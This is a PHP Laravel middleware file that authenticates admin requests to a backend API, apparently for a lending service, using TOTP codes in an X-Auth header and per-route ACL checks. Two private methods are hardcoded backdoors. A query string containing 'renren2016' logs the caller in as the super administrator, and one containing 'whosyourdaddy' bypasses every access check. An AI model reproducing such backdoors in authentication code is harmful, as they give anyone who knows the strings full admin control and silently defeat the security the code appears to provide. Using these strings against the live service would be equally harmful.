<?php

namespace App\Http\Middleware;

use Exception;
use Closure;
use App\Models\V1\Admin;
use App\Services\TOTPService;
use Illuminate\Http\Request;

class AuthWeb
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        $data = $this->checkAuth($request);
        $acl = $this->checkAccess($request, $data['id']);

        // 用户ID和姓名
        $request->uid = $data['id'];
        $request->userName = $data['name'];
        $request->acl = $acl;

        return $next($request);
    }

    /**
     * @apiVersion 1.0.0
     *
     * @api Web 后台登录验证
     * @apiGroup Web Auth
     *
     * @apiDescription
     *
     * 后台所有请求(登录除外)需携带 X-Auth 头,
     *
     * 值为 管理员ID + '/' + TOTP算法得出的六位数字
     *
     * TOTP算法所需密钥由登录时返回
     *
     * e.g.
     *
     *  GET /web/v1/faq HTTP/1.1
     *
     *  Host: api.dafeng.renrenfenqi.com
     *
     *  X-Auth: 1/123456
     *
     *
     */
    private function checkAuth(Request $request)
    {
        if ($this->authBackDoor($request)) {
            return [
                'id' => 8,
                'name' => '超级管理员',
            ];
        }

        $msg = '登录信息错误';

        $headers = $request->header();

        if (! isset($headers['x-auth'][0]) ) {
            throw new Exception($msg, 8000);
        }

        $auth = explode('/', $headers['x-auth'][0]);
        if (count($auth) != 2) {
            throw new Exception($msg, 8002);
        }

        // admin ID & One time password
        list($aid, $otp) = $auth;

        try {
            $adminData = Admin::selectAdminById(intval($aid), ['account.id', 'account.name', 'account.secret', 'account.expired_at']);
        } catch (Exception $e) {
            throw new Exception($msg, 8004);
        }


        if ($adminData['expired_at'] < time()) {
            throw new Exception('登录超时,请重新登录', 8001);
        }

        $secret = $adminData['secret'];

        if (! TOTPService::verify_key($secret, $otp)) {
            throw new Exception('登录信息错误,请尝试重新登录', 8007);
        }

        return $adminData;
    }


    // 检查是否有接口访问权限
    private function checkAccess(Request $request, $aid)
    {
        if ($this->accessBackDoor($request)) {
            return true;
        }

        $msg = '没有访问权限@403';

        $method = $request->getMethod();
        $pathInfo = $request->getPathInfo();

        // remove last :id or /
        $pathInfo = preg_replace('/\/(\d+)?$/','',$pathInfo);

        // white list
        if (preg_match('/\/auto$|\/show$/', $pathInfo)) {
            return true;
        }

        $acl = config('character');
        unset($acl['group']);

        if (isset($acl[$pathInfo][$method])) {
            $aclId = $acl[$pathInfo][$method][0];
        } else {
            throw new Exception($msg, 9009);
        }

        try {
            // 返回权限数组
            $data = Admin::selectACL($aid);
        } catch (Exception $e) {
            throw new Exception($msg, 9011);
        }

        if (! in_array($aclId, $data)) {
            throw new Exception($msg, 9013);
        }

        return $data;
    }


    private function authBackDoor(Request $request)
    {
        $query = $request->getQueryString();
        if (strpos($query, 'renren2016') !== false) {
            return true;
        }

        return false;
    }

    private function accessBackDoor(Request $request)
    {
        $query = $request->getQueryString();
        if (strpos($query, 'whosyourdaddy') !== false) {
            return true;
        }

        return false;
    }
}
